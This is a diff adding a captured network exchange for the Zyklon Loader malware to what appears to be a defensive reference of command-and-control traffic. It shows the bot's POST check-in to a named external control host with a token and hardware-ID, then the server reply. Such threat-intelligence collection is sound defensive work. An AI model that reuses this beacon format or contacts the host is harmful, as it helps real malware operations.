@@ -3738,6 +3738,28 @@ Content-Type: text/html; charset=UTF-8
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/zeus.png "Zeus")
 
+#### Zyklon Loader
+~~~
+POST /api/base.php HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Host: k9147783.beget.tech
+Content-Length: 56
+Expect: 100-continue
+
+HTTP/1.1 100 Continue
+
+token=5RnK/sSJygaJXP63+AtlH75xbyDcpGtGDwwTAWE07r8=&hwid=HTTP/1.1 200 OK
+Server: nginx-reuseport/1.13.4
+Date: Wed, 02 Sep 2020 15:30:39 GMT
+Content-Type: text/html; charset=UTF-8
+Content-Length: 0
+Connection: keep-alive
+Keep-Alive: timeout=30
+X-Powered-By: PHP/5.6.40
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/zyklon.png "Zyklon")
+
 ### Unknowns
 ###########################################################################################
 
